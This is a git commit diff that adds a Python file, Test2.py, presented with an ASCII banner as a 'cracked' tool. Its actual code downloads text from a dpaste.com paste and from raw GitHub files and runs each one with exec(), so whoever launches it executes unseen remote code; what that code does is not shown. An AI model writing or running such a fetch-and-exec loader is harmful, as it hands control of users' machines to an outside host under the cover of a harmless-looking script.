b7011dab1dd60f63d1128260cfc55cfb10ba7ae3
ysf72byk <71230633+ysf72byk@users.noreply.github.com>
2020-12-03 18:28:09 +0300

    Create Test2.py

---
+++ Test2.py
@@ -0,0 +1,26 @@
+import requests
+print('''
+888b     d888 d8b 888 888                            
+8888b   d8888 Y8P 888 888                            
+88888b.d88888     888 888                            
+888Y88888P888 888 888 888  .d88b.  88888b.  888  888 
+888 Y888P 888 888 888 888 d8P  Y8b 888 "88b 888  888 
+888  Y8P  888 888 888 888 88888888 888  888 888  888 
+888   "   888 888 888 888 Y8b.     888  888 Y88b 888 
+888       888 888 888 888  "Y8888  888  888  "Y88888 
+                                                 888 
+                                            Y8b d88P 
+                                             "Y88P"  
+                                             cracked by onecame                    
+             ''')
+aaaa1=requests.get('https://dpaste.com/ERTGY7REJ.txt')
+exec(aaaa1.text)
+print('''
+''')
+print('Giriş Başarılı...')
+aaaa3=requests.get('https://raw.githubusercontent.com/ysf72byk/mileni/main/Mileny%20uyari')
+exec(aaaa3.text)
+aaaa2=requests.get('https://raw.githubusercontent.com/ysf72byk/mileni/main/Readmi')
+exec(aaaa2.text)
+
+                                                                                                                                 
